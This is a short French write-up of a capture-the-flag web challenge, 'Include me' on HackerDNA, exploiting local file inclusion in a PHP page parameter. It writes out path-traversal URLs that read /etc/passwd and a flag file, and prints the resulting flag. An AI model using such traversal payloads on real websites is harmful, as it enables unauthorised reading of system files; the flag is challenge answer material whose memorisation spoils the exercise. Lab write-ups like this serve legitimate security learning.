---
# Imported from Obsidian: Hackerdna/Include me.md
title: Include me
category: Web
ctf: HackerDNA
date: 2026-05-05
summary: 'Démarrez la machine, hackez le système et trouvez les flags cachés pour compléter ce défi et gagner des XP! URL de départ : http://54.74.200.38/index.php?page=about.html…'
tags:
- hackerdna
- lfi
- php
- web
lang: fr
imported: true
---

#### Description

Démarrez la machine, hackez le système et trouvez les flags cachés pour compléter ce défi et gagner des XP!

**URL de départ :** [http://54.74.200.38/index.php?page=about.html](http://54.74.200.38/index.php?page=about.html)

L'application est une page PHP simple avec un paramètre `page` qui semble vulnérable à une **Local File Inclusion (LFI)**.

![Screenshot](./images/obsidian/include-me/pasted-image-20260505101205.png)
http://54.74.200.38/index.php?page=about.html
#### Reconnaissance et exploitation

#### 1. Test de base LFI

On teste immédiatement une inclusion de fichier système :

```
http://54.74.200.38/index.php?page=../../../etc/passwd
```
**Résultat :** Lecture réussie du fichier `/etc/passwd` !

![Screenshot](./images/obsidian/include-me/pasted-image-20260505100948.png)
#### 2. Recherche du flag

On cherche un fichier `flag.txt` dans le répertoire racine :

`http://54.74.200.38/index.php?page=../../../flag.txt`

![Screenshot](./images/obsidian/include-me/pasted-image-20260505101503.png)

>**Flag**
>12f15c36-b4ac-4b19-b179-40aab0874eeb
